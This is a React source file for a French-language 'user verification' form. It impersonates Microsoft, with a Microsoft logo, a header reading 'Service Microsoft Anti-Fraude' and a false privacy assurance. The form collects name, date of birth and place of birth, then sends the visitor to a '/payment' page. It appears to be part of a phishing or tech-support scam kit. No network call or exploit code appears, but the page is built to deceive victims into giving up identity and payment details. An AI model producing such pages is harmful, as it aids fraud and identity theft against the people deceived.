import { useState } from "react";
import Select from "react-select";
import { useNavigate } from "react-router-dom";

const countries = [
  { value: "FR", label: "🇫🇷 France" },
  { value: "US", label: "🇺🇸 United States" },
  { value: "TN", label: "🇹🇳 Tunisie" },
  { value: "DZ", label: "🇩🇿 Algérie" },
  { value: "MA", label: "🇲🇦 Maroc" },
  { value: "IT", label: "🇮🇹 Italie" },
  { value: "DE", label: "🇩🇪 Allemagne" },
  { value: "ES", label: "🇪🇸 Espagne" },
  { value: "CA", label: "🇨🇦 Canada" },
  { value: "JP", label: "🇯🇵 Japon" },
  { value: "CN", label: "🇨🇳 Chine" },
  { value: "BR", label: "🇧🇷 Brésil" },
  { value: "IN", label: "🇮🇳 Inde" },
  { value: "GB", label: "🇬🇧 Royaume-Uni" },
  { value: "RU", label: "🇷🇺 Russie" },
  { value: "SA", label: "🇸🇦 Arabie Saoudite" },
  { value: "EG", label: "🇪🇬 Égypte" },
  { value: "TR", label: "🇹🇷 Turquie" },
  { value: "NG", label: "🇳🇬 Nigéria" },
  { value: "ZA", label: "🇿🇦 Afrique du Sud" },
];

export default function UserVerificationForm({ onNext }) {
  const navigate = useNavigate();

  const [formData, setFormData] = useState({
    nom: "",
    prenom: "",
    dob: "",
    pob: null,
  });

  const [errors, setErrors] = useState({});

  const validate = () => {
    const newErrors = {};
    const nameRegex = /^[A-Za-zÀ-ÖØ-öø-ÿ\s'-]+$/;

    if (!formData.nom.trim()) {
      newErrors.nom = "Le nom est requis.";
    } else if (!nameRegex.test(formData.nom)) {
      newErrors.nom = "Le nom ne doit contenir que des lettres.";
    }

    if (!formData.prenom.trim()) {
      newErrors.prenom = "Le prénom est requis.";
    } else if (!nameRegex.test(formData.prenom)) {
      newErrors.prenom = "Le prénom ne doit contenir que des lettres.";
    }

    const today = new Date();
    const birthDate = new Date(formData.dob);

    if (!formData.dob) {
      newErrors.dob = "La date de naissance est requise.";
    } else if (birthDate > today) {
      newErrors.dob = "La date de naissance ne peut pas être dans le futur.";
    } else {
      let age = today.getFullYear() - birthDate.getFullYear();
      const m = today.getMonth() - birthDate.getMonth();
      if (m < 0 || (m === 0 && today.getDate() < birthDate.getDate())) {
        age--;
      }
      if (age < 5) {
        newErrors.dob = "L'âge minimum requis est de 5 ans.";
      }
    }

    if (!formData.pob) {
      newErrors.pob = "Le lieu de naissance est requis.";
    }

    return newErrors;
  };

  const handleChange = (e) => {
    setFormData({ ...formData, [e.target.id]: e.target.value });
    setErrors({ ...errors, [e.target.id]: "" });
  };

  const handleSelectChange = (selectedOption) => {
    setFormData({ ...formData, pob: selectedOption });
    setErrors({ ...errors, pob: "" });
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    const validationErrors = validate();
    if (Object.keys(validationErrors).length > 0) {
      setErrors(validationErrors);
    } else {
      const submittedData = {
        ...formData,
        pob: formData.pob?.label || "",
      };
      onNext(submittedData);
      navigate("/payment");
    }
  };

  return (
    <div className="form-container">
      <div className="form-header">
        <img
          src="https://img.icons8.com/color/48/microsoft.png"
          alt="Microsoft Logo"
          className="logo"
        />
        <h2>Service Microsoft Anti-Fraude aaa</h2>
      </div>

      <div className="form-title">
        <span className="lock-icon">🔒</span>
        <h1>Vérification de l'utilisateur</h1>
      </div>

      <form onSubmit={handleSubmit} noValidate>
        <div className="form-group">
          <label htmlFor="nom">Nom</label>
          <input
            type="text"
            id="nom"
            value={formData.nom}
            onChange={handleChange}
          />
          {errors.nom && <p className="error-message">{errors.nom}</p>}
        </div>

        <div className="form-group">
          <label htmlFor="prenom">Prénom</label>
          <input
            type="text"
            id="prenom"
            value={formData.prenom}
            onChange={handleChange}
          />
          {errors.prenom && <p className="error-message">{errors.prenom}</p>}
        </div>

        <div className="form-group">
          <label htmlFor="dob">Date de naissance</label>
          <input
            type="date"
            id="dob"
            value={formData.dob}
            onChange={handleChange}
          />
          {errors.dob && <p className="error-message">{errors.dob}</p>}
        </div>

        <div className="form-group">
          <label htmlFor="pob">Lieu de naissance</label>
          <Select
            options={countries}
            value={formData.pob}
            onChange={handleSelectChange}
            placeholder="-- Sélectionner un pays --"
            className="react-select-container"
            classNamePrefix="react-select"
          />
          {errors.pob && <p className="error-message">{errors.pob}</p>}
        </div>

        <button type="submit" className="btn-submit">
          Suivant
        </button>
      </form>

      <p className="privacy-text">
        Microsoft respecte votre vie privée. Aucune donnée n'est stockée sans
        consentement.
      </p>

      <style jsx>{`
        .form-container {
          max-width: 500px;
          margin: auto;
          padding: 20px;
          background: white;
          border-radius: 12px;
          box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }

        .form-header {
          display: flex;
          align-items: center;
          gap: 10px;
        }

        .form-title {
          margin: 20px 0;
          display: flex;
          align-items: center;
          gap: 10px;
        }

        .form-group {
          margin-bottom: 15px;
        }

        .form-group input {
          width: 95%;
          padding: 8px;
          font-size: 16px;
          border: 1px solid #ccc;
          border-radius: 4px;
        }

        .btn-submit {
          width: 100%;
          padding: 10px;
          font-size: 16px;
          background-color: #0078d4;
          color: white;
          border: none;
          cursor: pointer;
          border-radius: 4px;
        }

        .btn-submit:hover {
          background-color: #005fa3;
        }

        .error-message {
          color: red;
          font-size: 0.9em;
          margin-top: 4px;
        }

        .privacy-text {
          font-size: 0.8em;
          margin-top: 20px;
          text-align: center;
        }

        .react-select-container {
          font-size: 16px;
        }

        .react-select__control {
          border-radius: 4px;
          padding: 2px;
        }
      `}</style>
    </div>
  );
}
